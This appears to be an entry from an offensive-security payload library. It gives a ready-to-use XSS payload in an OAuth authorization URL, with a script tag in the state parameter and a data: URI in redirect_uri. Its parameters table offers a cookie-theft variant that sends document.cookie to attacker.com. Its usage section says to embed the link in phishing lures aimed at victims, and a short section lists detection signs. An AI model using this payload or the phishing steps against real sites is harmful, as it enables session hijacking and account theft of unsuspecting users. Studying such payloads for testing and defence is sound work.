---
id: 42af2927-341f-437d-a1fe-423456dc8dca
name: OAuth-Authorization-XSS-URL-Payload
type: code
language: url
verified: true
created_at: '2023-04-06T03:56:31.641746+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xss
  - oauth
  - payload
validated: true
---

# OAuth-Authorization-XSS-URL-Payload

## Code

```url
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## Description

This URL payload crafts a malicious OAuth authorization request that injects an XSS via a data: URI in the redirect_uri parameter and a script tag in the state parameter. When accessed in a browser, if the endpoint reflects the state without encoding, it executes arbitrary JavaScript, such as alerting or stealing data. The [...] represents additional required parameters like client_id and response_type.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| example.com | Target domain hosting the OAuth endpoint | target-app.com |
| [...] | Placeholder for required params (e.g., client_id=abc123&response_type=code) | client_id=abc123&response_type=code&scope=openid |
| alert('XSS') | The XSS payload to execute | document.location='http://attacker.com?data='+document.cookie |

## Usage

Embed this URL in a phishing link or lure the victim to click it during an OAuth flow. Replace placeholders with target-specific values. Test in a browser to confirm execution; use a proxy to inspect reflections. This payload is delivered client-side, so no server execution occurs on the attacker machine.

## Detection

- Web application firewall (WAF) rules blocking data: URIs or <script> in query params.
- Server logs showing anomalous state parameters with script tags.
- Browser CSP violations or JS execution logs.
- Network monitoring for unexpected redirects to data: schemes.

## Related

- [[Related Procedure]]: [[procedures/Exploit-XSS-via-OAuth-Redirect-URI-Misconfiguration]]
- [[Related Tool]]: [[tools/Burp-Suite]]
